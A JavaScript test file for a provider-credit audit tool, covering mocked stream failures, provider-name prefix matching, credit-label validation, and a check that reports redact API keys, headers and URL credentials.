  const creditsPath = await writeCredits(t, [validOffer({ provider: "Vyceai.com", models: ["m1"] })]);
  const piDir = await writePi(t, {
    vyceai: { api: "openai-completions", apiKey: "sk-literal-vyce", baseUrl: "https://vyceai.test/v1", models: [] },
  });
  const failingBody = {
    getReader() {
      return { read: async () => { throw new Error("stream exploded"); } };
    },
  };
  const { fetchImpl } = mockFetch([
    {
      match: "/chat/completions",
      response: { status: 200, headers: { get: () => null }, body: failingBody, text: async () => { throw new Error("body locked"); } },
    },
  ]);
  const report = await runAudit({ creditsPath, piDir, live: true, fetchImpl, env: {} });
  const entry = report.providers[0].models[0];
  assert.equal(entry.attempted, true);
  assert.equal(entry.status, "network_error");
});

test("provider matching requires exact or unambiguous long-prefix matches", async (t) => {
  // 1. A short prefix never binds: "Acme" must not capture Pi provider "acmecloud".
  {
    const creditsPath = await writeCredits(t, [validOffer({ provider: "Acme", models: ["am1"] })]);
    const piDir = await writePi(t, {
      acmecloud: { api: "openai-completions", apiKey: "sk-acme", baseUrl: "https://acmecloud.test/v1", models: [{ id: "cm1" }] },
    });
    const { fetchImpl, calls } = mockFetch([{ match: "/chat/completions", response: res(200, workingChatSSE) }]);
    const report = await runAudit({ creditsPath, piDir, live: true, fetchImpl, env: {} });
    assert.equal(report.providers.length, 2);
    const acme = report.providers.find((p) => p.slug === "acme");
    const cloud = report.providers.find((p) => p.slug === "acmecloud");
    assert.equal(acme.models.length, 1);
    assert.equal(acme.models[0].attempted, false);
    assert.equal(cloud.models.length, 1);
    assert.equal(cloud.models[0].model, "cm1");
    assert.equal(cloud.models[0].attempted, true);
    assert.ok(calls.every((c) => c.url.includes("acmecloud.test")));
  }
  // 2. An ambiguous prefix binds nothing: "deltas" matches two offers.
  {
    const creditsPath = await writeCredits(t, [
      validOffer({ provider: "DeltasX", models: ["dx1"] }),
      validOffer({ provider: "DeltasY", url: "https://example.test/y", models: ["dy1"] }),
    ]);
    const piDir = await writePi(t, {
      deltas: { api: "openai-completions", apiKey: "sk-deltas", baseUrl: "https://deltas.test/v1", models: [{ id: "pm1" }] },
    });
    const { fetchImpl } = mockFetch([{ match: "/chat/completions", response: res(200, workingChatSSE) }]);
    const report = await runAudit({ creditsPath, piDir, live: true, fetchImpl, env: {} });
    const deltas = report.providers.find((p) => p.slug === "deltas");
    assert.ok(deltas);
    assert.equal(deltas.models.length, 1);
    assert.equal(deltas.models[0].model, "pm1");
    assert.match(deltas.matchNote, /ambiguous/i);
    assert.equal(report.providers.find((p) => p.slug === "deltasx").models[0].attempted, false);
  }
  // 3. A second Pi provider never steals an already-bound offer.
  {
    const creditsPath = await writeCredits(t, [validOffer({ provider: "Epsilon", models: ["em1"] })]);
    const piDir = await writePi(t, {
      epsilon: { api: "openai-completions", apiKey: "sk-eps", baseUrl: "https://epsilon.test/v1", models: [] },
      epsilonlabs: { api: "openai-completions", apiKey: "sk-epsl", baseUrl: "https://epsilonlabs.test/v1", models: [{ id: "el1" }] },
    });
    const { fetchImpl, calls } = mockFetch([{ match: "/chat/completions", response: res(200, workingChatSSE) }]);
    const report = await runAudit({ creditsPath, piDir, live: true, fetchImpl, env: {} });
    const bound = report.providers.find((p) => p.slug === "epsilon" && p.sources.includes("credits"));
    const separate = report.providers.find((p) => p.slug === "epsilonlabs");
    assert.ok(bound && separate);
    assert.equal(bound.models[0].model, "em1");
    assert.equal(bound.models[0].sources, "credits+pi");
    assert.equal(separate.models[0].model, "el1");
    assert.ok(calls.some((c) => c.url.includes("epsilon.test") && JSON.parse(c.options.body).model === "em1"));
    assert.ok(calls.some((c) => c.url.includes("epsilonlabs.test") && JSON.parse(c.options.body).model === "el1"));
  }
});

test("credit labels must be positive and properly grouped", () => {
  const cases = [
    ["$0 Credits", "$0"],
    ["0 Credits", "0 credits"],
    [", Credits", ","],
    ["1,,2 Credits", "1,,2 credits"],
    ["$40,00 Credits", "$40,00"],
  ];
  for (const [credits, short] of cases) {
    const errors = validateCredits({ offers: [validOffer({ credits, creditsShort: short })] });
    assert.ok(
      errors.some((e) => /credit (label|amount)/.test(e)),
      `${credits} must be rejected by the label check (got: ${errors.join(" | ")})`,
    );
  }
  assert.deepEqual(validateCredits({ offers: [validOffer({ credits: "300,000 Credits", creditsShort: "300,000 credits" })] }), []);
  assert.deepEqual(validateCredits({ offers: [validOffer({ credits: "$40.50 Credits", creditsShort: "$40.50" })] }), []);
  assert.deepEqual(validateCredits({ offers: [validOffer({ credits: "500 Credits", creditsShort: "500 credits" })] }), []);
});

test("reports never carry raw authenticated bodies, codes, or URL credentials", async (t) => {
  const creditsPath = await writeCredits(t, [validOffer({ provider: "Vyceai.com", models: ["m1"] })]);
  const piDir = await writePi(t, {
    vyceai: {
      api: "openai-completions",
      apiKey: "sk-vyce-literal-SECRETVALUE",
      baseUrl: "https://u:p@vyceai.test/v1",
      headers: { "X-Custom": "custom-secret-value" },
      models: [],
    },
  });
  const { fetchImpl } = mockFetch([
    { match: "/models", response: res(200, "<html>authorized as sk-vyce-literal-SECRETVALUE custom-secret-value</html>") },
    { match: "/chat/completions", response: res(200, sse({ error: { code: "echo-sk-vyce-literal-SECRETVALUE", message: "denied" } })) },
  ]);
  const report = await runAudit({ creditsPath, piDir, catalogs: true, live: true, fetchImpl, env: {} });
  const serialized = JSON.stringify(report);
  assert.ok(!serialized.includes("SECRETVALUE"));
  assert.ok(!serialized.includes("custom-secret-value"));
  assert.ok(!serialized.includes("authorized as"));
  assert.ok(!serialized.includes("u:p@"));
  const provider = report.providers[0];
  assert.ok(provider.baseUrl.includes("vyceai.test"));
  assert.equal(provider.catalog.error, "non-JSON catalog response");
  assert.ok(provider.models[0].code.includes("REDACTED"));
});
